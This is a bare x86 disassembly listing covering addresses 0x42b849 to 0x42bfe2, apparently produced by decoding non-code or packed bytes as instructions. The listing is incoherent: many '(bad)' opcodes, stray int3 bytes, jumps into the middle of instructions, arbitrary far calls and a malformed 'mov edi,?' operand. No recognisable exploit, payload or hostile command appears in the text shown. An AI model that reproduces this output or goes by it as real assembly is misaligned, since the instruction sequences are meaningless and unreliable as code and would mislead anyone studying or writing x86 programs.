  42b849:	gs mov ebx,ebx
  42b84c:	dec    DWORD PTR [ecx-0x23edc57d]
  42b852:	xor    DWORD PTR [ecx+0x4189ccff],0xc
  42b859:	test   BYTE PTR [eax],0x31
  42b85c:	(bad)  
  42b85d:	inc    DWORD PTR [eax]
  42b85f:	sbb    BYTE PTR ss:[ecx+0x0],dl
  42b863:	fcos   
  42b865:	add    BYTE PTR [ebx-0x7c0e97c0],al
  42b86b:	in     al,dx
  42b86c:	inc    DWORD PTR [eax]
  42b86e:	add    dh,bl
  42b870:	les    edi,FWORD PTR [eax+eax*1+0x8912]
  42b877:	xchg   esi,eax
  42b878:	dec    esi
  42b879:	push   ds
  42b87a:	int3   
  42b87b:	push   ecx
  42b87c:	dec    DWORD PTR [ecx-0x335de97d]
  42b882:	call   FWORD PTR [eax-0x1]
  42b885:	add    BYTE PTR [eax],al
  42b887:	push   ebp
  42b888:	rol    esi,0x83
  42b88b:	fadd   DWORD PTR [eax]
  42b88d:	inc    DWORD PTR [eax]
  42b88f:	jl     0x42b847
  42b891:	and    al,0x0
  42b893:	mov    edi,?
  42b895:	mov    DWORD PTR [eax],eax
  42b897:	repnz cdq 
  42b899:	push   ds
  42b89a:	int3   
  42b89b:	cmp    eax,0xfcffcc00
  42b8a0:	and    eax,0xccb3ffaa
  42b8a5:	inc    DWORD PTR [eax]
  42b8a7:	(bad)  
  42b8a8:	retf   0x8975
  42b8ab:	scas   eax,DWORD PTR es:[edi]
  42b8ac:	inc    DWORD PTR [ebx+0x69f9aff]
  42b8b2:	add    BYTE PTR [eax],ch
  42b8b4:	cmp    edi,0xffffffff
  42b8b7:	into   
  42b8b8:	jnp    0x42b83b
  42b8ba:	call   DWORD PTR [ebx]
  42b8bc:	add    bh,bh
  42b8be:	add    BYTE PTR [ecx-0x2affb5ef],bl
  42b8c4:	(bad)  
  42b8c5:	(bad)  
  42b8c6:	inc    DWORD PTR [ecx]
  42b8c8:	pop    ebx
  42b8c9:	sar    bh,1
  42b8cb:	mov    bh,0x89
  42b8cd:	add    bh,bh
  42b8cf:	arpl   WORD PTR [ecx+edx*8-0x7d],di
  42b8d3:	and    al,0x83
  42b8d5:	(bad)  
  42b8d6:	push   DWORD PTR [ebp+ebp*8-0xcaffe5]
  42b8dd:	inc    DWORD PTR [eax]
  42b8df:	nop
  42b8e0:	xchg   al,ah
  42b8e2:	add    BYTE PTR [edx-0x1],dh
  42b8e5:	inc    DWORD PTR [eax]
  42b8e7:	cmp    DWORD PTR [ecx-0xc633f4],ebx
  42b8ed:	cmp    edi,0x69
  42b8f0:	mov    cs,WORD PTR [ecx]
  42b8f2:	dec    DWORD PTR [edi+0x0]
  42b8f5:	(bad)  
  42b8f6:	dec    edx
  42b8f8:	xchg   ecx,eax
  42b8f9:	js     0x42b8fb
  42b8fb:	adc    ecx,esp
  42b8fd:	inc    DWORD PTR [eax]
  42b8ff:	cdq    
  42b900:	jmp    0x42b8f1
  42b902:	mov    DWORD PTR [ebx],esi
  42b904:	add    BYTE PTR [ebx+0x461a8ff],al
  42b90a:	add    DWORD PTR [edi+edi*8],0xffffffff
  42b90e:	add    DWORD PTR [ecx+0x61],0xffffffb0
  42b912:	adc    eax,0xffffffff
  42b915:	add    BYTE PTR [eax],al
  42b917:	xor    cl,BYTE PTR ds:0xffe483c3
  42b91d:	(bad)  
  42b91e:	inc    DWORD PTR [ebp+0xff69fd]
  42b924:	int3   
  42b925:	inc    DWORD PTR [eax]
  42b927:	xor    eax,DWORD PTR [edx-0x7a]
  42b92a:	push   DWORD PTR [ecx]
  42b92c:	(bad)  
  42b92d:	inc    DWORD PTR [eax]
  42b92f:	jbe    0x42b8f0
  42b931:	stc    
  42b932:	(bad)  
  42b933:	dec    DWORD PTR [ecx-0x150b7c7d]
  42b939:	and    al,0x0
  42b93b:	jp     0x42b93c
  42b93d:	(bad)  
  42b93e:	call   FWORD PTR [eax+0x1effadb5]
  42b944:	dec    DWORD PTR [ecx+0x6049dcff]
  42b94a:	call   DWORD PTR [ecx]
  42b94c:	add    DWORD PTR [ebx+0x42cd1e00],0xffffffff
  42b953:	sar    bh,cl
  42b955:	inc    DWORD PTR [eax]
  42b957:	ret    0x64c7
  42b95a:	add    BYTE PTR [edx-0x1],dl
  42b95d:	cmp    edi,0xffffffdc
  42b960:	jmp    0x8956b8c0
  42b965:	(bad)  
  42b966:	dec    DWORD PTR [edi]
  42b968:	mov    ah,0x27
  42b96a:	add    BYTE PTR [eax+0x1bcc00ff],al
  42b970:	cmp    cl,BYTE PTR [edi-0x7d]
  42b973:	mov    esp,0x6a00ffff
  42b978:	daa    
  42b979:	inc    eax
  42b97a:	add    BYTE PTR [ecx],dl
  42b97c:	add    BYTE PTR [ebx+0xb7281ff],al
  42b982:	add    al,bh
  42b984:	int3   
  42b985:	inc    DWORD PTR [ebx-0xbcbcc1]
  42b98b:	mov    eax,0xb9cc89ff
  42b990:	outs   dx,BYTE PTR ds:[esi]
  42b991:	jb     0x42b993
  42b993:	adc    ah,cl
  42b995:	int3   
  42b996:	jmp    DWORD PTR [ecx+0xcffea35]
  42b99c:	(bad)  
  42b99d:	dec    DWORD PTR [ecx-0x336e9754]
  42b9a3:	jecxz  0x42b9a4
  42b9a5:	add    DWORD PTR [eax],0xffffff93
  42b9a8:	ins    BYTE PTR es:[edi],dx
  42b9a9:	iret   
  42b9aa:	dec    DWORD PTR [ebx]
  42b9ac:	add    BYTE PTR [eax],al
  42b9ae:	jmp    FWORD PTR [ecx-0x3e006027]
  42b9b4:	int3   
  42b9b5:	add    BYTE PTR [ecx+0x5a3c57],cl
  42b9bb:	add    DWORD PTR [eax],0xffffffcc
  42b9be:	cmp    DWORD PTR [edx-0xf],0x49
  42b9c2:	(bad)  
  42b9c3:	fcmove st,st(4)
  42b9c5:	add    BYTE PTR [eax],al
  42b9c7:	(bad)  
  42b9c9:	pop    ebp
  42b9ca:	sbb    edx,0x0
  42b9cd:	add    BYTE PTR [eax],al
  42b9cf:	fwait
  42b9d0:	mov    ah,0x27
  42b9d2:	call   FWORD PTR [ebp-0x73ff7d00]
  42b9d8:	add    BYTE PTR [eax+eax*1-0x50],0xd3
  42b9e0:	data16 jnp 0x42b9e2
  42b9e3:	and    edi,edi
  42b9e5:	inc    DWORD PTR [ebx-0x7c505e6f]
  42b9eb:	xchg   edx,eax
  42b9ec:	int3   
  42b9ed:	int3   
  42b9ee:	add    BYTE PTR [esi-0x5f000f6c],dl
  42b9f4:	cmp    edi,0xffffff83
  42b9f7:	adc    al,0x80
  42b9f9:	sar    edi,cl
  42b9fb:	mov    cl,0x0
  42b9fd:	mov    DWORD PTR [eax],eax
  42b9ff:	and    al,0x2a
  42ba01:	xor    BYTE PTR [eax],al
  42ba03:	mov    edi,0xdaccffff
  42ba08:	sbb    esi,DWORD PTR [ecx+0x0]
  42ba0b:	ss (bad) 
  42ba0d:	dec    DWORD PTR [ecx-0x76eef0d3]
  42ba13:	loopne 0x42ba15
  42ba15:	inc    DWORD PTR [eax]
  42ba17:	fstp   st(6)
  42ba19:	arpl   sp,cx
  42ba1b:	adc    eax,DWORD PTR [ebx+0x32048300]
  42ba21:	xor    eax,DWORD PTR [eax]
  42ba23:	aaa    
  42ba24:	add    bh,bh
  42ba26:	add    al,al
  42ba28:	cmp    al,0x78
  42ba2a:	add    BYTE PTR [edx+0x2cffffff],bh
  42ba30:	sub    dh,BYTE PTR [eax-0x76ff4f01]
  42ba36:	(bad)  
  42ba37:	fistp  QWORD PTR [edi-0x77006c]
  42ba3d:	dec    esp
  42ba3f:	mov    BYTE PTR [edx+0x59],dh
  42ba42:	or     ebx,0xffffffcc
  42ba45:	(bad)  
  42ba46:	dec    DWORD PTR [ecx-0x2f]
  42ba49:	add    al,0xff
  42ba4b:	jecxz  0x42b9d6
  42ba4d:	mov    edi,edi
  42ba4f:	adc    DWORD PTR [edi],ebx
  42ba51:	xor    al,0x0
  42ba53:	repnz int3 
  42ba55:	inc    DWORD PTR [eax]
  42ba57:	xor    ch,BYTE PTR cs:[esi-0xff7f7d]
  42ba5e:	jmp    DWORD PTR [ecx+0x3f]
  42ba61:	mov    bl,0xff
  42ba63:	popa   
  42ba64:	dec    esp
  42ba66:	int3   
  42ba67:	and    DWORD PTR [eax+edx*2],eax
  42ba6a:	add    bl,dh
  42ba6c:	add    bh,bh
  42ba6e:	sbb    edi,0xffffff8e
  42ba71:	data16 (bad) 
  42ba73:	jl     0x42ba75
  42ba75:	inc    DWORD PTR [eax]
  42ba77:	xor    eax,0xd4cc3811
  42ba7c:	dec    esp
  42ba7e:	sbb    DWORD PTR [esi+eiz*4+0x4a],0xffffffff
  42ba83:	std    
  42ba84:	(bad)  
  42ba85:	inc    DWORD PTR [eax]
  42ba87:	add    eax,0x23ff4d18
  42ba8c:	add    BYTE PTR [eax],al
  42ba8e:	add    BYTE PTR [ecx-0x5e],dl
  42ba91:	iret   
  42ba92:	add    DWORD PTR [edi+0x39ff00cc],0xffffff98
  42ba99:	mov    WORD PTR [ecx+0x89e0],cs
  42ba9f:	mov    ah,BYTE PTR [edi+0x0]
  42baa2:	mov    DWORD PTR [eax],ecx
  42baa4:	inc    DWORD PTR [eax]
  42baa6:	jmp    DWORD PTR [ebp-0x40001369]
  42baac:	inc    DWORD PTR [eax]
  42baae:	add    BYTE PTR [edx+0x54],dh
  42bab1:	fdiv   st(7),st
  42bab3:	inc    esp
  42bab4:	add    ah,cl
  42bab6:	add    BYTE PTR [esi+0x34],ah
  42bab9:	xchg   ebp,eax
  42baba:	add    BYTE PTR [esi+0x88300ff],bh
  42bac0:	add    al,0x46
  42bac2:	call   DWORD PTR [edx]
  42bac4:	add    DWORD PTR [ebx+0x4196500],0x0
  42bacb:	(bad)  
  42bacc:	int3   
  42bacd:	inc    DWORD PTR [eax]
  42bacf:	inc    edi
  42bad0:	xor    DWORD PTR [ebx],ecx
  42bad2:	(bad)  
  42bad3:	mov    ecx,0x9f00ff00
  42bad8:	mov    eax,cs
  42bada:	add    bl,dl
  42badc:	inc    DWORD PTR [eax]
  42bade:	push   DWORD PTR [eax+0x70038d9]
  42bae4:	(bad)  
  42bae5:	(bad)  
  42bae6:	dec    DWORD PTR [esi-0xe004598]
  42baec:	mov    DWORD PTR [eax],eax
  42baee:	mov    DWORD PTR [ecx],esp
  42baf0:	pop    edi
  42baf1:	fadd   DWORD PTR [eax]
  42baf3:	pop    esi
  42baf4:	add    bh,bh
  42baf6:	int3   
  42baf7:	inc    ebx
  42baf8:	das    
  42baf9:	and    eax,DWORD PTR [ebx+0x83004c]
  42baff:	fdivp  st(7),st
  42bb01:	imul   edi,edi,0xff837e
  42bb07:	das    
  42bb08:	test   BYTE PTR [ecx-0xffa200],0x89
  42bb0f:	test   DWORD PTR [ecx],esp
  42bb11:	cmp    BYTE PTR [eax],al
  42bb13:	cmp    bh,0x89
  42bb16:	inc    DWORD PTR [ecx+edi*4-0x18]
  42bb1a:	add    al,ch
  42bb1c:	add    bh,bh
  42bb1e:	add    BYTE PTR [ecx],ch
  42bb20:	jp     0x42bb8c
  42bb22:	int3   
  42bb23:	cli    
  42bb24:	(bad)  
  42bb25:	dec    esp
  42bb27:	fwait
  42bb28:	shl    BYTE PTR [eax-0x33763977],1
  42bb2e:	jmp    DWORD PTR [esi-0x57]
  42bb31:	push   esp
  42bb32:	call   FWORD PTR [ecx]
  42bb34:	inc    DWORD PTR [eax]
  42bb36:	mov    esi,esp
  42bb38:	inc    esp
  42bb39:	jecxz  0x42bb07
  42bb3b:	cmp    BYTE PTR [eax],al
  42bb3d:	(bad)  
  42bb3e:	(bad)  
  42bb3f:	mov    esi,0xd90034e2
  42bb44:	inc    DWORD PTR [eax]
  42bb46:	add    BYTE PTR [esi],dl
  42bb48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb49:	mov    al,0xff
  42bb4b:	mov    WORD PTR [eax],es
  42bb4d:	dec    esp
  42bb4f:	lods   eax,DWORD PTR ds:[esi]
  42bb50:	mov    ebx,0xffd0ffce
  42bb55:	inc    DWORD PTR [eax]
  42bb57:	pop    ds
  42bb58:	mov    ss,ebp
  42bb5a:	or     DWORD PTR [esi+0x0],0x0
  42bb5e:	jmp    FWORD PTR [eax+esi*4-0x2e]
  42bb62:	int3   
  42bb63:	inc    DWORD PTR ds:[eax]
  42bb66:	add    al,bl
  42bb68:	jo     0x42bb44
  42bb6a:	call   ecx
  42bb6c:	dec    esp
  42bb6e:	add    BYTE PTR [esp+edi*2+0x3d],dh
  42bb72:	dec    DWORD PTR [eax-0x3e000001]
  42bb78:	mov    al,ds:0xe0001a
  42bb7d:	cmp    edi,0x50
  42bb80:	lods   al,BYTE PTR ds:[esi]
  42bb81:	lahf   
  42bb82:	(bad)  
  42bb83:	fild   WORD PTR [eax]
  42bb85:	add    bh,bh
  42bb87:	popa   
  42bb88:	addr16 cdq 
  42bb8a:	push   DWORD PTR [edx-0x1]
  42bb8d:	inc    DWORD PTR [ebx-0x98e3e5]
  42bb93:	out    0x0,al
  42bb95:	inc    DWORD PTR [eax]
  42bb97:	push   es
  42bb98:	mov    BYTE PTR [edi],bh
  42bb9a:	add    ah,dh
  42bb9c:	inc    DWORD PTR [ebx-0x48df8800]
  42bba2:	int3   
  42bba3:	mov    al,ds:0x8dff0000
  42bba8:	xchg   ebx,eax
  42bba9:	sahf   
  42bbaa:	dec    ebx
  42bbac:	(bad)  
  42bbad:	(bad)  
  42bbae:	dec    DWORD PTR [eax+0xc004f0d]
  42bbb4:	cmp    edi,0xffffffff
  42bbb7:	int3   
  42bbb8:	leave  
  42bbb9:	int3   
  42bbba:	add    dl,ch
  42bbbc:	inc    DWORD PTR [eax]
  42bbbe:	call   FWORD PTR ds:0x57009bc9
  42bbc4:	add    BYTE PTR [eax],al
  42bbc6:	call   DWORD PTR [ebx-0x5e]
  42bbc9:	test   al,0xff
  42bbcb:	lods   eax,DWORD PTR ds:[esi]
  42bbcc:	inc    DWORD PTR [eax]
  42bbce:	inc    DWORD PTR [ebp+edi*4+0x200033]
  42bbd5:	mov    edi,edi
  42bbd7:	fld    DWORD PTR [edi-0x18]
  42bbda:	add    DWORD PTR [edi-0x32ff0100],0x36
  42bbe1:	add    bh,bh
  42bbe3:	nop
  42bbe4:	add    BYTE PTR [eax],al
  42bbe6:	jmp    FWORD PTR [edx]
  42bbe8:	push   ecx
  42bbe9:	mov    ecx,esp
  42bbeb:	sar    bh,0xff
  42bbee:	add    BYTE PTR [ecx+0x78],bl
  42bbf1:	mov    dl,0x0
  42bbf3:	sldt   WORD PTR [eax]
  42bbf6:	push   DWORD PTR [edx-0x1c]
  42bbf9:	das    
  42bbfa:	mov    DWORD PTR [eax+0x0],esi
  42bbfd:	add    bh,bh
  42bbff:	and    bh,bl
  42bc01:	cld    
  42bc02:	mov    DWORD PTR [ecx-0x28760100],esp
  42bc08:	in     eax,0x3
  42bc0a:	call   FWORD PTR [edi]
  42bc0c:	inc    DWORD PTR [eax]
  42bc0e:	call   FWORD PTR [ebx+edx*4-0x9]
  42bc12:	jmp    DWORD PTR [ebx+0x7500ffcc]
  42bc18:	lds    ebp,FWORD PTR [eax+eax*1-0x7c3362]
  42bc1f:	pop    esi
  42bc20:	dec    ebx
  42bc21:	fs dec ebp
  42bc24:	add    bh,bh
  42bc26:	add    ah,ah
  42bc28:	or     BYTE PTR [eax],ch
  42bc2a:	dec    DWORD PTR [edx]
  42bc2c:	inc    DWORD PTR [eax]
  42bc2e:	(bad)  
  42bc2f:	inc    DWORD PTR [eax+0x19ffd4]
  42bc35:	(bad)  
  42bc36:	(bad)  
  42bc37:	jg     0x42bbc6
  42bc39:	lods   al,BYTE PTR ds:[esi]
  42bc3a:	add    BYTE PTR [ecx+0x3c00cc00],cl
  42bc40:	adc    BYTE PTR [esi+0x0],al
  42bc43:	inc    DWORD PTR [bp+di-0x137d]
  42bc48:	(bad)  
  42bc49:	sbb    ah,cl
  42bc4b:	push   es
  42bc4c:	dec    DWORD PTR [ecx-0x3a4dd201]
  42bc52:	sbb    DWORD PTR [ebp+0x6500ff00],0xffffffbe
  42bc59:	icebp  
  42bc5a:	mov    DWORD PTR [ebx+eax*4-0x7ac10000],edx
  42bc61:	dec    ah
  42bc63:	push   0xffffff83
  42bc65:	int3   
  42bc66:	or     ebx,0xffffffdc
  42bc69:	jno    0x42bbee
  42bc6b:	or     al,BYTE PTR [ebx-0x33070000]
  42bc71:	and    eax,0xffffdeff
  42bc76:	call   DWORD PTR [edi-0x6ff1184]
  42bc7c:	inc    DWORD PTR [eax]
  42bc7e:	add    BYTE PTR [ebx+0x4a],cl
  42bc81:	push   edi
  42bc82:	add    bh,dh
  42bc84:	dec    DWORD PTR [ecx+0x755ccf83]
  42bc8a:	dec    DWORD PTR [eax]
  42bc8c:	int3   
  42bc8d:	(bad)  
  42bc8e:	call   FWORD PTR [ebx]
  42bc90:	test   DWORD PTR [edi-0x7c7c3500],ebx
  42bc96:	add    BYTE PTR [edi],ch
  42bc98:	stc    
  42bc99:	enter  0x99ff,0x89
  42bc9d:	(bad)  
  42bc9e:	inc    DWORD PTR [ecx-0x62]
  42bca1:	or     al,0x0
  42bca3:	popf   
  42bca4:	(bad)  
  42bca5:	(bad)  
  42bca6:	jmp    DWORD PTR [eax+0x2f]
  42bca9:	(bad)  
  42bcaa:	call   DWORD PTR [ebx]
  42bcac:	add    BYTE PTR [eax],al
  42bcae:	jmp    FWORD PTR ds:0x870042e3
  42bcb4:	add    BYTE PTR [ebx+0x76689583],al
  42bcba:	cmp    edi,0xffffffff
  42bcbd:	add    DWORD PTR [eax],0x2e
  42bcc0:	ss add eax,0x8383d5ff
  42bcc6:	xor    DWORD PTR [edi+ecx*2-0x3b],0xffffffff
  42bccb:	xor    bh,bh
  42bccd:	inc    DWORD PTR [eax]
  42bccf:	rcl    BYTE PTR [esi],1
  42bcd1:	xor    bh,bh
  42bcd3:	adc    al,BYTE PTR [eax]
  42bcd5:	dec    esp
  42bcd7:	push   cs
  42bcd8:	jp     0x42bcfd
  42bcda:	add    BYTE PTR [eax],dh
  42bcdc:	int3   
  42bcdd:	mov    edi,edi
  42bcdf:	dec    eax
  42bce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bce1:	inc    ecx
  42bce2:	add    BYTE PTR [ebp-0x7d],bl
  42bce5:	(bad)  
  42bce6:	inc    DWORD PTR [edx-0x517c7079]
  42bcec:	cmp    edi,0xffffffff
  42bcef:	xor    al,0x9b
  42bcf1:	sar    edi,1
  42bcf3:	push   ecx
  42bcf4:	inc    DWORD PTR [ebx-0x53f1d334]
  42bcfa:	mov    DWORD PTR [ebx],ebx
  42bcfc:	(bad)  
  42bcfd:	(bad)  
  42bcfe:	dec    DWORD PTR [ecx+0x6bffdc40]
  42bd04:	(bad)  
  42bd05:	inc    DWORD PTR [eax]
  42bd07:	mov    esp,0x68ffe8dc
  42bd0c:	(bad)  
  42bd0d:	dec    DWORD PTR [ecx+0x7c9b9b]
  42bd13:	mov    ebx,0xadccccff
  42bd18:	sub    eax,0xba00df
  42bd1d:	cmp    edi,0xffffff87
  42bd20:	or     eax,0x830c0005
  42bd25:	cmp    edi,0x79
  42bd28:	mov    BYTE PTR [eax+eax*1],bh
  42bd2b:	sar    edi,0xff
  42bd2e:	inc    ebp
  42bd30:	xor    ebp,DWORD PTR [edi+0xa7ff]
  42bd36:	jmp    FWORD PTR [eax-0x2576a8e9]
  42bd3c:	(bad)  
  42bd3d:	inc    DWORD PTR [ebx+0x9e953f]
  42bd43:	adc    edi,edi
  42bd45:	(bad)  
  42bd46:	push   DWORD PTR [ecx]
  42bd48:	in     al,dx
  42bd49:	mov    ds:0xff6a83,al
  42bd4e:	add    BYTE PTR [edi+0x7e83b4bc],ch
  42bd54:	add    bh,bh
  42bd56:	and    DWORD PTR [eax],0x22
  42bd59:	(bad)  
  42bd5b:	xchg   esi,eax
  42bd5c:	inc    DWORD PTR [eax]
  42bd5e:	jmp    FWORD PTR [ecx]
  42bd60:	and    BYTE PTR [ebx],cl
  42bd62:	mov    DWORD PTR [eax],esi
  42bd64:	add    BYTE PTR [eax],al
  42bd66:	(bad)  
  42bd67:	fiadd  DWORD PTR [ebx]
  42bd69:	hlt    
  42bd6a:	push   DWORD PTR [edx]
  42bd6c:	add    bh,bh
  42bd6e:	add    BYTE PTR [eax],ch
  42bd70:	ds mov eax,0xffff72ff
  42bd76:	push   DWORD PTR [esi+0x5b]
  42bd79:	mov    ebx,0xff83ae83
  42bd7e:	or     ebx,0x23
  42bd81:	(bad)  
  42bd83:	pusha  
  42bd84:	cmp    edi,0xffffffff
  42bd87:	mov    esp,0x3cff3ae9
  42bd8c:	dec    esp
  42bd8e:	sub    DWORD PTR [edx-0x39],0x4f
  42bd92:	cmp    DWORD PTR [edx-0x43ffff01],0x30
  42bd99:	call   0xe989:0x7d83
  42bda0:	jbe    0x42bd7b
  42bda2:	add    BYTE PTR [edi+0x75ff8300],dh
  42bda8:	dec    ebx
  42bda9:	stos   BYTE PTR es:[edi],al
  42bdaa:	add    BYTE PTR [ecx-0x55007c01],cl
  42bdb0:	dec    esi
  42bdb1:	sbb    ecx,esp
  42bdb3:	mov    dh,0x0
  42bdb5:	add    bh,bh
  42bdb7:	(bad)  
  42bdb9:	inc    ebp
  42bdba:	add    BYTE PTR [eax+0x4c000083],bh
  42bdc0:	aas    
  42bdc1:	out    dx,al
  42bdc2:	call   DWORD PTR [esi+0x0]
  42bdc5:	add    DWORD PTR [ebx+0x7f15cb],0xffffff97
  42bdcc:	(bad)  
  42bdcd:	(bad)  
  42bdce:	(bad)  
  42bdcf:	ficomp DWORD PTR [edi]
  42bdd1:	lock push DWORD PTR [esi]
  42bdd4:	or     esp,0xffffffff
  42bdd7:	loope  0x42bdfb
  42bdd9:	adc    al,0xcc
  42bddb:	retf   0xccff
  42bdde:	call   FWORD PTR [ebp+0x2bff88db]
  42bde4:	int3   
  42bde5:	add    bh,bh
  42bde7:	lahf   
  42bde8:	jns    0x42bdea
  42bdea:	call   DWORD PTR [edi-0x1]
  42bded:	add    BYTE PTR [eax],al
  42bdef:	and    al,0xdd
  42bdf1:	ja     0x42bdf2
  42bdf3:	push   esi
  42bdf4:	inc    DWORD PTR [ebx+0x5baa7ff]
  42bdfa:	call   DWORD PTR [esi]
  42bdfc:	inc    DWORD PTR [eax]
  42bdfe:	add    BYTE PTR [ebx-0x46],cl
  42be01:	mov    ds:0xff0092ff,al
  42be06:	mov    DWORD PTR [edx],edx
  42be08:	out    0x5b,al
  42be0a:	dec    DWORD PTR [edi-0x11000100]
  42be10:	xor    al,bl
  42be12:	int3   
  42be13:	push   esi
  42be14:	cmp    edi,0xffffffff
  42be17:	mov    al,ds:0xf3009da7
  42be1c:	add    BYTE PTR [ebx-0x12f68901],al
  42be22:	add    DWORD PTR [edi+edi*8-0x1],0xffffff83
  42be27:	pop    si
  42be29:	mov    esp,0xff833d00
  42be2e:	add    esp,0xffffffc5
  42be31:	fld    QWORD PTR [eax]
  42be33:	das    
  42be34:	add    bh,bh
  42be36:	int3   
  42be37:	cwde   
  42be38:	cwde   
  42be39:	sti    
  42be3a:	add    BYTE PTR [edx],ch
  42be3c:	add    DWORD PTR [eax],0xffffffcc
  42be3f:	leave  
  42be40:	jb     0x42be52
  42be42:	inc    DWORD PTR [edx-0x1]
  42be45:	add    bh,bh
  42be47:	mov    esp,0xbd83d603
  42be4c:	dec    esp
  42be4e:	add    BYTE PTR [ecx],dl
  42be50:	add    edx,DWORD PTR [ebp-0xed01]
  42be56:	push   DWORD PTR [esp+ebx*1+0x583fd]
  42be5d:	add    ah,cl
  42be5f:	adc    al,0x76
  42be61:	retf   
  42be62:	add    BYTE PTR [edi-0x7d],dh
  42be65:	add    DWORD PTR [eax],0xffffffd1
  42be68:	out    0xb4,al
  42be6a:	int3   
  42be6b:	add    bh,bh
  42be6d:	dec    esp
  42be6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be70:	hlt    
  42be71:	scas   al,BYTE PTR es:[edi]
  42be72:	add    BYTE PTR [ecx],ch
  42be74:	add    ah,cl
  42be76:	(bad)  
  42be77:	in     al,dx
  42be78:	xchg   ecx,eax
  42be79:	mov    al,0xff
  42be7b:	mov    bh,bh
  42be7d:	add    BYTE PTR [ecx-0x76e37395],cl
  42be83:	cs add bh,bh
  42be86:	sbb    DWORD PTR [esi+0x2200f679],0x0
  42be8d:	(bad)  
  42be8e:	(bad)  
  42be8f:	jp     0x42bec2
  42be91:	sub    bh,bh
  42be93:	jno    0x42be95
  42be95:	inc    DWORD PTR [eax]
  42be97:	push   ebx
  42be98:	or     cl,BYTE PTR [ecx-0x1]
  42be9b:	and    al,0xff
  42be9d:	add    BYTE PTR [eax],al
  42be9f:	mov    ecx,0x1bff428b
  42bea4:	add    bh,bh
  42bea6:	add    BYTE PTR [ecx-0xeff001b],bl
  42beac:	dec    esp
  42beae:	add    BYTE PTR [esi+0xbff0884],bh
  42beb4:	inc    DWORD PTR [ebx+0x687c78cc]
  42beba:	inc    DWORD PTR [ebx+eax*4-0x60300001]
  42bec1:	test   bh,bh
  42bec3:	xchg   ebp,eax
  42bec4:	add    bh,bh
  42bec6:	(bad)  
  42bec7:	clc    
  42bec8:	sbb    edx,DWORD PTR [ebx+eax*4-0x7c39]
  42becf:	cmp    BYTE PTR [ecx-0xf33d9],0xff
  42bed6:	add    ah,al
  42bed8:	pop    ds
  42bed9:	mov    ah,0xff
  42bedb:	sbb    edi,edi
  42bedd:	cmp    edi,0xffffffb8
  42bee0:	es xor edi,edi
  42bee3:	sbb    ecx,esp
  42bee5:	(bad)  
  42bee6:	inc    DWORD PTR [edx-0x52]
  42bee9:	dec    ebx
  42beea:	xor    DWORD PTR [ebx+eax*4],0xffffffff
  42beee:	mov    DWORD PTR [ebp+edx*4+0x20],ecx
  42bef2:	push   DWORD PTR [eax-0x1]
  42bef5:	add    ah,cl
  42bef7:	sub    esp,esp
  42bef9:	sbb    eax,DWORD PTR [eax]
  42befb:	xchg   edi,edi
  42befd:	(bad)  
  42befe:	push   DWORD PTR [ebp+0x7d]
  42bf01:	idiv   edi
  42bf03:	dec    esi
  42bf04:	add    bh,bh
  42bf06:	add    BYTE PTR [edx-0x1d],dl
  42bf09:	loop   0x42be94
  42bf0b:	mov    edi,edi
  42bf0d:	cmp    edi,0x62
  42bf10:	mov    ebx,edx
  42bf12:	mov    DWORD PTR [ebx],ebx
  42bf14:	inc    DWORD PTR [eax]
  42bf16:	call   DWORD PTR [ebx]
  42bf18:	mov    ch,0x52
  42bf1a:	sub    DWORD PTR [edx],0xffffff83
  42bf1d:	mov    edi,edi
  42bf1f:	aad    0xf6
  42bf21:	ret    
  42bf22:	dec    DWORD PTR [eax-0x7d]
  42bf25:	dec    DWORD PTR [ecx+0x619e9f]
  42bf2b:	inc    ebp
  42bf2c:	add    bh,bh
  42bf2e:	push   ebx
  42bf30:	fldpi  
  42bf32:	add    ch,bh
  42bf34:	inc    DWORD PTR [ebx-0x17437e7d]
  42bf3a:	call   DWORD PTR [ebp-0x6f760077]
  42bf40:	add    al,0xf5
  42bf42:	add    BYTE PTR [ecx+ecx*4-0x6b550100],bh
  42bf49:	repnz add BYTE PTR [esi-0x7b000034],dl
  42bf50:	add    eax,esi
  42bf52:	add    bh,bl
  42bf54:	dec    esp
  42bf56:	inc    ecx
  42bf58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf59:	loop   0x42bf27
  42bf5b:	test   eax,0x82ff0000
  42bf60:	pop    ebx
  42bf61:	stos   BYTE PTR es:[edi],al
  42bf62:	mov    DWORD PTR [esi],esi
  42bf64:	int3   
  42bf65:	add    bh,bh
  42bf67:	sbb    eax,0x74ff1938
  42bf6c:	int3   
  42bf6d:	inc    DWORD PTR [ebx-0xfb0ad8]
  42bf73:	mov    bl,0x0
  42bf75:	inc    DWORD PTR [eax]
  42bf77:	xchg   ebx,eax
  42bf78:	in     eax,dx
  42bf79:	mov    eax,0xccffba83
  42bf7e:	add    BYTE PTR [ebp-0x16],ch
  42bf81:	or     al,BYTE PTR [eax]
  42bf83:	jbe    0x42bf08
  42bf85:	cmp    edi,0x29
  42bf88:	pop    edi
  42bf89:	xlat   BYTE PTR ds:[ebx]
  42bf8a:	add    BYTE PTR [esi-0x1],cl
  42bf8d:	(bad)  
  42bf8e:	push   DWORD PTR [esi*1+0xe0ff54]
  42bf95:	int3   
  42bf96:	inc    DWORD PTR [eax-0x79000740]
  42bf9c:	dec    DWORD PTR [ecx+0x46c5c5ff]
  42bfa2:	push   DWORD PTR [eax-0x77]
  42bfa5:	inc    DWORD PTR [ebx-0x3383ab2f]
  42bfab:	dec    ecx
  42bfac:	add    BYTE PTR [eax],al
  42bfae:	call   FWORD PTR [esi-0x44]
  42bfb1:	(bad)  
  42bfb2:	call   DWORD PTR [edx]
  42bfb4:	inc    DWORD PTR [eax]
  42bfb6:	add    BYTE PTR [edx-0x4affaf57],ah
  42bfbc:	or     esp,0x0
  42bfbf:	and    ecx,edi
  42bfc1:	push   ebp
  42bfc2:	add    BYTE PTR [eax-0x1],cl
  42bfc5:	inc    DWORD PTR [eax]
  42bfc7:	and    eax,0xad007f92
  42bfcc:	inc    DWORD PTR [ebx+0x1bb5f00]
  42bfd2:	int3   
  42bfd3:	(bad)  
  42bfd5:	add    BYTE PTR [eax],al
  42bfd7:	(bad)  
  42bfd8:	xchg   ebp,eax
  42bfd9:	repnz (bad) 
  42bfdb:	cld    
  42bfdc:	inc    DWORD PTR [eax]
  42bfde:	(bad)  
  42bfdf:	stc    
  42bfe0:	into   
  42bfe1:	out    dx,eax
  42bfe2:	dec    esi
